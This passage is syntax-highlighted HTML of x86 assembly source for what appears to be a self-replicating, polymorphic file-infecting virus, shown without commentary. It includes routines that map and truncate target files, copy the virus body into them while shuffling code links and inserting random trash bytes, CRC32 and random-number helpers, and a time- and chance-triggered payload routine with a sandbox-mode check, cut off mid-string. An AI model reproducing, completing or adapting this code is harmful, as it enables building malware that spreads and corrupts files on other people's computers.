</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">e3_Map</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">e2_Map</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">e1_Map</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Map</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">Replicate</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@_ProgSize</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Replicate</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">ReplicateAndMix</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateSource</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateDest</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wSecond</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000FFFFh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BakerTimes</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@_ChainSize</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">@_ChainSize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc5">@_LinkSize</span><span class="sc0">


</span><span class="sc5">_1_ReplicateAndMix</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateDest</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Baker</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkPosNlj</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateSource</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Baker</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateDest</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">@_LinkPosReloc</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0000000FFh</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_2_ReplicateAndMix</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc5">_3_ReplicateAndMix</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateSource</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Baker</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReplicateDest</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_2_ReplicateAndMix</span><span class="sc0">

</span><span class="sc5">_3_ReplicateAndMix</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Baker</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_LinkSize</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">_2_ReplicateAndMix</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">@_LinkPosTrash</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@_LinkPosTrashSize</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_4_ReplicateAndMix</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Rand</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">@@_loop</span><span class="sc0"> </span><span class="sc5">_4_ReplicateAndMix</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@@_jns</span><span class="sc0"> </span><span class="sc5">_1_ReplicateAndMix</span><span class="sc0">


</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ReplicateAndMix</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">; Maths</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">Crc32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_1_Crc32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_4_Crc32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_2_Crc32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@_jnc</span><span class="sc0"> </span><span class="sc5">_3_Crc32</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">_3_Crc32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_Crc32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_1_Crc32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_4_Crc32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Crc32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">Rand</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RandSeed</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0361962E9h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Rand</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">Baker</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_ChainSize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BakerTimes</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_1_Baker</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_jna</span><span class="sc0"> </span><span class="sc5">_2_Baker</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">_2_Baker</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@@_loop</span><span class="sc0"> </span><span class="sc5">_1_Baker</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Baker</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">; Payload</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">




</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_1_Payload</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_ModeSandBox</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_1_Payload</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeSimple</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_PayloadTimeMask</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_PayloadTime</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_Payload</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Rand</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_PayloadRandMask</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_Payload</span><span class="sc0">

</span><span class="sc5">_1_Payload</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;User32ModuleHandle</span><span class="sc0">
</span><span class="sc1">;MessageBoxA2</span><span class="sc0">
</span><span class="sc1">;strings 23</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">00</span><span class="sc4">],</span><span class="sc3">"U"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc3">"S"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc3">"E"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc3">"R"</span><span class="sc0">
